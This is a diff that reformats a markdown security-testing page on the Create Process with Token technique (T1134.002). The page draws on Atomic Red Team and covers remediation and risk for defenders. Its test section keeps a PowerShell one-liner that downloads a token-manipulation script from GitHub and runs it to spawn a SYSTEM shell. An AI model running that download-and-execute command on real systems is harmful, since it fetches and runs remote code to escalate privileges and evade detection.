@@ -72,8 +72,8 @@ The following tests are from [Atomic Red Team](https://github.com/redcanaryco/at
 
 ### Atomic Test 1: Access Token Manipulation
 
-This Action demonstrates how an access token for a specific program can spawn another program under a different owner. 
-Adversaries can leverage access tokens to run programs under a different user not only to achieve privilege escalation but also to evade detection by blending in with normal user activity. 
+This Action demonstrates how an access token for a specific program can spawn another program under a different owner.
+Adversaries can leverage access tokens to run programs under a different user not only to achieve privilege escalation but also to evade detection by blending in with normal user activity.
 This Action will query all processes and list the process name and owner.It will then make a copy of an existing token to create a new instance of cmd.exe
 
 **Supported Platforms:** windows
@@ -97,7 +97,6 @@ Get SYSTEM shell - Pop System Shell using Token Manipulation technique via funct
 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem
 ```
 
-
 ### Manual Testing
 
 If Atomic Red Team tests are not applicable, manually verify the technique by:
@@ -111,35 +110,34 @@ If Atomic Red Team tests are not applicable, manually verify the technique by:
 ## Remediation Guide
 
 ### M1026 Privileged Account Management
+
 Limit permissions so that users and user groups cannot create tokens. This setting should be defined for the local system account only. GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Create a token object. Also define who can create a process level token to only the local and network service through GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Replace a process level token.
 
 Administrators should log in as a standard user but run their tools with administrator privileges using the built-in access token manipulation command <code>runas</code>.
 
 ### M1018 User Account Management
-An adversary must already have administrator level access on the local system to make full use of this technique; be sure to restrict users and accounts to the least privileges they require.
 
+An adversary must already have administrator level access on the local system to make full use of this technique; be sure to restrict users and accounts to the least privileges they require.
 
 ## Detection
 
 ### Behavior-chain detection for T1134.002 Create Process with Token (Windows)
 
-
 ## Risk Assessment
 
-| Finding | Severity | Impact |
-| ------- | -------- | ------ |
-| Create Process with Token technique applicable | High | Defense Evasion |
+| Finding                                        | Severity | Impact          |
+| ---------------------------------------------- | -------- | --------------- |
+| Create Process with Token technique applicable | High     | Defense Evasion |
 
 ## CWE Categories
 
-| CWE ID | Title |
-| ------ | ----- |
+| CWE ID  | Title                        |
+| ------- | ---------------------------- |
 | CWE-693 | Protection Mechanism Failure |
-
 
 ## References
 
 - [Microsoft Command-line Logging](https://technet.microsoft.com/en-us/windows-server-docs/identity/ad-ds/manage/component-updates/command-line-process-auditing)
-- [Microsoft RunAs](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11))
+- [Microsoft RunAs](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)>)
 - [Atomic Red Team - T1134.002](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1134.002)
 - [MITRE ATT&CK - T1134.002](https://attack.mitre.org/techniques/T1134/002)
